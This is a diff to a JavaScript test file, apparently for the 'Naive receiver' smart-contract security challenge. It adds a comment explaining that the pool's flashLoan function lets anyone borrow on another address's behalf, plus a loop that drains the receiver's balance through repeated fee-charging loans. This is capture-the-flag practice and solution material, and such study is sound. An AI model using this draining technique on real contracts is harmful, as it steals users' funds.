@@ -31,6 +31,15 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        /* 
+            Vulnerability:
+            The LenderPool.flashLoan function does not check that the borrower is also msg.sender
+            allowing the attaker to drain the recipient's balance by making repeated loans on the
+            recipient's behalf
+        */
+        while(await ethers.provider.getBalance(this.receiver.address) > 0) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
+        }
     });
 
     after(async function () {
